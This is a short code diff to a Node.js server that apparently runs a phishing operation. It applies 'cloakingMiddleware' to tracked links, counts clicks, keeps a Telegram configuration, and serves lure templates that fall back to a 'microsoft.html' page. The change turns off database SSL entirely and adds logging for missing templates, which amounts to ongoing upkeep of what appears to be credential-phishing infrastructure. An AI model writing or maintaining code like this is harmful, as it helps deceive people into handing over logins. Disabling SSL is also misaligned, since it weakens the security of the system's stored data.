@@ -21,7 +21,7 @@ const pool = new Pool({
     user: process.env.DB_USER,
     password: process.env.DB_PASS,
     database: process.env.DB_NAME,
-    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
+    ssl: false
 });
 
 // Telegram Config
@@ -156,8 +156,15 @@ app.get('/t/:id', cloakingMiddleware, async (req, res) => {
     if (link) {
         link.clicks++;
         await saveLink(link);
-        const templatePath = path.join(publicPath, `${link.template}.html`);
-        res.sendFile(fs.existsSync(templatePath) ? templatePath : path.join(publicPath, 'microsoft.html'));
+        const templateFile = `${link.template}.html`;
+        const templatePath = path.join(publicPath, templateFile);
+        
+        if (fs.existsSync(templatePath)) {
+            res.sendFile(templatePath);
+        } else {
+            console.log(`[SERVER] Template not found: ${templatePath}, falling back to microsoft.html`);
+            res.sendFile(path.join(publicPath, 'microsoft.html'));
+        }
     } else {
         res.sendFile(path.join(publicPath, 'microsoft.html'));
     }
